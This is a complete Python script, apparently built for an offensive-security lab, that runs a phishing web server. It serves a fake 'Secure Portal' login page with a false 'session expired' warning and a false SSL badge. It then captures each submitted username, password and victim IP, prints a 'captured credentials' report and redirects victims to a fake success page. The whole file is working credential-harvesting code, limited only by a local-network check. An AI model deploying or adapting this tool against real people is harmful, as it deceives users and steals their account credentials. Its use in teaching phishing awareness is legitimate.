#!/usr/bin/env python3

import http.server
import socketserver
import urllib.parse
import argparse
import ipaddress
import socket
from datetime import datetime
import os
import sys

# =============================================================================
# CONFIGURATION
# =============================================================================
DEFAULT_PORT = 80
ALLOWED_NETWORK = None  # Will be set based on server's IP

# Store captured credentials
captured_credentials = []

# =============================================================================
# HTML TEMPLATES
# =============================================================================
FAKE_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login - Account Verification Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 24px;
        }
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        .warning-banner {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .footer-links {
            text-align: center;
            margin-top: 20px;
        }
        .footer-links a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .security-note {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        .security-note span {
            color: #28a745;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>🔐 Secure Portal</h1>
            <p>Network Authentication Required</p>
        </div>
        
        <div class="warning-banner">
            ⚠️ Your session has expired. Please log in again to continue.
        </div>
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        
        <div class="footer-links">
            <a href="#">Forgot Password?</a>
            <a href="#">Create Account</a>
        </div>
        
        <div class="security-note">
            <span>🔒</span> Protected by SSL Security
        </div>
    </div>
</body>
</html>
"""

FAKE_SUCCESS_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Successful</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .success-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 400px;
        }
        .checkmark {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h1 {
            color: #28a745;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
        }
        .redirect-note {
            color: #999;
            font-size: 14px;
        }
    </style>
    <meta http-equiv="refresh" content="3;url=http://neverssl.com">
</head>
<body>
    <div class="success-container">
        <div class="checkmark">✅</div>
        <h1>Login Successful!</h1>
        <p>Your session has been restored.</p>
        <p class="redirect-note">Redirecting you in 3 seconds...</p>
    </div>
</body>
</html>
"""

ACCESS_DENIED_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Access Denied</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #1a1a2e;
            color: #eee;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 40px;
        }
        h1 {
            color: #e74c3c;
            font-size: 48px;
        }
        p {
            color: #aaa;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚫 Access Denied</h1>
        <p>You are not authorized to access this resource.</p>
        <p>This service is only available on the local network.</p>
    </div>
</body>
</html>
"""

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================
def get_local_ip():
    """Get the local IP address of this machine."""
    try:
        # Connect to a public IP to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def is_ip_allowed(client_ip, allowed_network):
    """Check if client IP is within allowed network."""
    try:
        client = ipaddress.ip_address(client_ip)
        network = ipaddress.ip_network(allowed_network, strict=False)
        return client in network
    except ValueError:
        return False

def print_banner(port, network, local_ip):
    """Print startup banner."""
    print("\n" + "="*60)
    print("    🎣 Phishing Server - Lab on Offensive Cyber Security")
    print("="*60)
    print(f"\n    Server IP:      {local_ip}")
    print(f"    Port:           {port}")
    print(f"    Allowed Network: {network}")
    print(f"\n    URL: http://{local_ip}:{port}/")
    if port == 80:
        print(f"    URL: http://{local_ip}/")
    print("\n" + "="*60)
    print("    Waiting for victims to connect...")
    print("    Press Ctrl+C to stop and view captured credentials")
    print("="*60 + "\n")

def print_credentials_report():
    """Print all captured credentials."""
    print("\n" + "="*70)
    print("              CAPTURED CREDENTIALS REPORT")
    print("="*70)
    
    if not captured_credentials:
        print("\n    No credentials were captured during this session.\n")
    else:
        print(f"\n    Total captures: {len(captured_credentials)}\n")
        for i, cred in enumerate(captured_credentials, 1):
            print(f"    [{i}] {cred['timestamp']}")
            print(f"        👤 Username: {cred['username']}")
            print(f"        🔑 Password: {cred['password']}")
            print(f"        🌐 Victim IP: {cred['client_ip']}")
            print()
    
    print("="*70 + "\n")

# =============================================================================
# HTTP REQUEST HANDLER
# =============================================================================
class PhishingHandler(http.server.BaseHTTPRequestHandler):
    """HTTP Request Handler for the phishing server."""
    
    def log_message(self, format, *args):
        """Custom logging."""
        client_ip = self.client_address[0]
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {client_ip} - {args[0]}")
    
    def check_access(self):
        """Check if client IP is allowed."""
        client_ip = self.client_address[0]
        
        # Always allow localhost
        if client_ip in ['127.0.0.1', '::1']:
            return True
        
        if ALLOWED_NETWORK and not is_ip_allowed(client_ip, ALLOWED_NETWORK):
            print(f"[ACCESS DENIED] {client_ip} is not in allowed network {ALLOWED_NETWORK}")
            self.send_response(403)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(ACCESS_DENIED_HTML.encode('utf-8'))
            return False
        
        return True
    
    def do_GET(self):
        """Handle GET requests - serve the login page."""
        if not self.check_access():
            return
        
        client_ip = self.client_address[0]
        print(f"[GET] {client_ip} requested: {self.path}")
        
        # Serve login page for any path
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(FAKE_LOGIN_HTML))
        self.end_headers()
        self.wfile.write(FAKE_LOGIN_HTML.encode('utf-8'))
        
        print(f"[SERVED] Fake login page sent to {client_ip}")
    
    def do_POST(self):
        """Handle POST requests - capture credentials."""
        if not self.check_access():
            return
        
        client_ip = self.client_address[0]
        
        # Read POST data
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse credentials
        params = urllib.parse.parse_qs(post_data)
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        
        # Store credentials
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        captured_credentials.append({
            'timestamp': timestamp,
            'username': username,
            'password': password,
            'client_ip': client_ip
        })
        
        # Print captured credentials prominently
        print("   CREDENTIALS CAPTURED!   ")
        print(f"    ⏰ Time:      {timestamp}")
        print(f"    🌐 Victim IP: {client_ip}")
        print(f"    👤 Username:  {username}")
        print(f"    🔑 Password:  {password}")
        
        # Send success page
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(FAKE_SUCCESS_HTML))
        self.end_headers()
        self.wfile.write(FAKE_SUCCESS_HTML.encode('utf-8'))

# =============================================================================
# MAIN
# =============================================================================
def main():
    global ALLOWED_NETWORK
    
    parser = argparse.ArgumentParser(
        description="Phishing Server",
        epilog="Example: sudo python3 phishing_server.py --port 80 --network 192.168.1.0/24"
    )
    parser.add_argument('--port', type=int, default=DEFAULT_PORT,
                        help=f'Port to listen on (default: {DEFAULT_PORT})')
    parser.add_argument('--network', type=str, default=None,
                        help='Allowed network in CIDR notation (e.g., 192.168.1.0/24). '
                             'If not specified, auto-detects based on server IP.')
    args = parser.parse_args()
    
    # Get local IP
    local_ip = get_local_ip()
    
    # Set allowed network
    if args.network:
        ALLOWED_NETWORK = args.network
    else:
        # Auto-detect: allow /24 network based on server IP
        ALLOWED_NETWORK = f"{local_ip}/24"
    
    # Check if we need root for port 80
    if args.port < 1024 and os.geteuid() != 0:
        print(f"[!] Port {args.port} requires root privileges.")
        print(f"[!] Run with: sudo python3 {sys.argv[0]} --port {args.port}")
        sys.exit(1)
    
    # Print banner
    print_banner(args.port, ALLOWED_NETWORK, local_ip)
    
    # Create and start server
    try:
        with socketserver.TCPServer(("0.0.0.0", args.port), PhishingHandler) as httpd:
            httpd.allow_reuse_address = True
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[!] Server shutting down...")
        print_credentials_report()
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"\n[!] Port {args.port} is already in use.")
            print(f"[!] Try a different port: python3 {sys.argv[0]} --port 8080")
        else:
            raise

if __name__ == "__main__":
    main()
